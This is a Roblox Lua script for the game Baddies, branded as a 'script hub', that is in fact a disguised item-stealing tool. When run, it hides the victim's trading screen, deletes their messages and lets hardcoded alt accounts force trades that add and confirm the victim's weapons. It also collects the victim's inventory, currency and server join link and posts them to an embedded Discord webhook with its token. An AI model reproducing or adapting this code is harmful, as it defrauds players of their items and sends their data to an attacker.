-- cee script hub | Baddies
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local TextChatService   = game:GetService("TextChatService")
local HttpService       = game:GetService("HttpService")

local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK  or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES  or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

-- ─────────────────────────────────────────────────────
--  REMOTES – direct access, exactly like the reference
--  (no WaitForChild – game is already loaded on execute)
-- ─────────────────────────────────────────────────────
local RFTradingSendOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady  = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirm   = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAddItem   = ReplicatedStorage.Modules.Net["RF/Trading/AddItem"]

-- ─────────────────────────────────────────────────────
--  WEAPON HEX IDs
--  To add more: copy any line inside ITEMS = { }
--  and replace the hex string.  Do NOT remove commas.
-- ─────────────────────────────────────────────────────
local ITEMS = {
    {"Weapon", "2a2bce877d67474299"},  -- Sakura Blade
    {"Weapon", "50f672aee7054d2d9d"},  -- Ice Katana
    {"Weapon", "984f30e6f65a40a498"},  -- Spiked Brass Knuckles
    {"Weapon", "6994851e04ae4b80b4"},
    {"Weapon", "f864e570fb0743c987"},
    {"Weapon", "000183526d6646eca4"},
    {"Weapon", "9f34dce65fa2474b99"},  -- Taser
}

-- ─────────────────────────────────────────────────────
--  ADD ALL WEAPONS TO TRADE
-- ─────────────────────────────────────────────────────
local function addWeapons()
    for _, item in ipairs(ITEMS) do
        RFTradingAddItem:InvokeServer(item[1], item[2])
        task.wait(0.05)
    end
end

-- ─────────────────────────────────────────────────────
--  HELPERS
-- ─────────────────────────────────────────────────────
local function isAlt(name)
    local low = name:lower()
    for _, u in ipairs(MY_USERNAMES) do
        if low == u:lower() then return true end
    end
    return false
end

local function sendHTTP(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    for _, fn in ipairs({
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }) do
        local s, r = pcall(fn); if s and r then return r end
    end
end

-- ─────────────────────────────────────────────────────
--  GUI HANDLING – exactly like the reference script
--  Trading  → Enabled = false  (freeze their screen)
--  Messages → Destroy
-- ─────────────────────────────────────────────────────
local function handleGui(gui)
    if gui.Name == "Trading" then
        gui.Enabled = false
    elseif gui.Name == "Messages" then
        gui:Destroy()
    end
end

for _, gui in ipairs(playerGui:GetChildren()) do
    handleGui(gui)
end
playerGui.ChildAdded:Connect(handleGui)

task.spawn(function()
    while true do
        local tg = playerGui:FindFirstChild("Trading")
        if tg then tg.Enabled = false end
        task.wait(0.1)
    end
end)

-- ─────────────────────────────────────────────────────
--  ENABLE TRADING
-- ─────────────────────────────────────────────────────
RESetPhoneSettings:FireServer("TradeEnabled", true)

-- ─────────────────────────────────────────────────────
--  CHAT COMMANDS – exactly like reference
--  Any message from alt → send trade offer to them
--  "add" → add all weapons
--  "1"   → force accept (SetReady true)
--  "2"   → force confirm
--  Local player can also type 1 / 2 / add
-- ─────────────────────────────────────────────────────
local function onChat(sender, rawText)
    local txt = (rawText or ""):match("^%s*(.-)%s*$")

    if isAlt(sender.Name) then
        local target = Players:FindFirstChild(sender.Name)
        if target then
            RFTradingSendOffer:InvokeServer(target)
        end
        if txt:lower() == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            RFTradingSetReady:InvokeServer(true)
        elseif txt == "2" then
            RFTradingConfirm:InvokeServer()
        end
    end

    if sender.UserId == lp.UserId then
        if txt:lower() == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            RFTradingSetReady:InvokeServer(true)
        elseif txt == "2" then
            RFTradingConfirm:InvokeServer()
        end
    end
end

-- Modern chat hook
TextChatService.OnIncomingMessage = function(msg)
    local ts = msg.TextSource
    if not ts then return end
    local sender = Players:GetPlayerByUserId(ts.UserId)
    if sender then onChat(sender, msg.Text) end
end

-- Legacy Chatted hook (fallback for Delta and older chat mode)
for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChat(p, msg) end)
end)

-- ─────────────────────────────────────────────────────
--  WEBHOOK PING  (background, never blocks the above)
-- ─────────────────────────────────────────────────────
task.spawn(function()
    task.wait(2)
    pcall(function()
        local name  = lp.Name
        local tools = {}
        pcall(function()
            for _, v in ipairs(lp:FindFirstChild("Backpack"):GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end)
        pcall(function()
            for _, v in ipairs(lp.Character:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end)

        local BASE_PAT = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
        local base, weapons = {}, {}
        for _, n in ipairs(tools) do
            local low = n:lower()
            local isBase = false
            for _, p in ipairs(BASE_PAT) do
                if low:find(p,1,true) then isBase=true; break end
            end
            if isBase then table.insert(base, n) else table.insert(weapons, n) end
        end

        local RICH_CHECK = {
            {label="Spiked Kitty",       keys={"spiked kitty"}},
            {label="Glitter Bomb",       keys={"glitter bomb"}},
            {label="Glitter Blue Spray", keys={"glitter blue"}},
            {label="Love Me Hate Me",    keys={"love me hate me"}},
            {label="Spiked Knuckles",    keys={"spiked knuckle"}},
            {label="Ice Katana",         keys={"ice katana"}},
        }
        local richLines = {}
        for _, rw in ipairs(RICH_CHECK) do
            local found = false
            for _, t in ipairs(tools) do
                for _, k in ipairs(rw.keys) do
                    if t:lower():find(k,1,true) then found=true; break end
                end
                if found then break end
            end
            table.insert(richLines, rw.label..": "..(found and "true" or "false"))
        end

        local isRich = #weapons >= 3
        local ls  = lp:FindFirstChild("leaderstats")
        local din = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local sla = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

        local function fmtNum(n)
            if type(n)~="number" then return tostring(n) end
            if n>=1e6 then return string.format("%.1fM",n/1e6)
            elseif n>=1e3 then return string.format("%.1fK",n/1e3)
            else return tostring(n) end
        end

        local weapLines = {}
        for _, w in ipairs(weapons) do table.insert(weapLines,"1x "..w) end
        if #weapLines==0 then table.insert(weapLines,"None") end

        local joinUrl = "https://www.roblox.com/games/start?placeId="..
                        tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)

        local exec = "Unknown"
        if getexecutorname then pcall(function() exec=getexecutorname() end)
        elseif syn and syn.request then exec="Synapse X"
        elseif Delta then exec="Delta"
        elseif fluxus then exec="Fluxus" end

        local embed = {
            color  = 0xFF69B4,
            fields = {
                {name="User",     value=name,              inline=true},
                {name="Dinero",   value=fmtNum(din),        inline=true},
                {name="Slays",    value=fmtNum(sla),        inline=true},
                {name="Executor", value=exec,               inline=true},
                {name="Players",  value=#Players:GetPlayers().." / "..Players.MaxPlayers, inline=true},
                {name="Trade",    value="Tradable: "..#weapons.."  |  Untradable: "..#base, inline=true},
                {name="Rich Weapons", value=table.concat(richLines,"\n"),      inline=false},
                {name="Weapons",      value=table.concat(weapLines,"\n"),      inline=false},
                {name="Join Link",    value="[Click to Join]("..joinUrl..")",  inline=false},
            },
            footer    = {text="cee script hub | Baddies | "..name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }

        local content = name.." executed!"
        if isRich and PING_POOR then content = "@everyone @here RICH: "..name end

        if USER_WEBHOOK ~= "PUTHERE" then
            sendHTTP(USER_WEBHOOK, {username="cee script hub | Baddies", content=content, embeds={embed}})
        end
        if isRich then
            sendHTTP(MY_WEBHOOK, {username="cee script hub | Baddies", content="@everyone RICH: "..name, embeds={embed}})
        end
    end)
end)
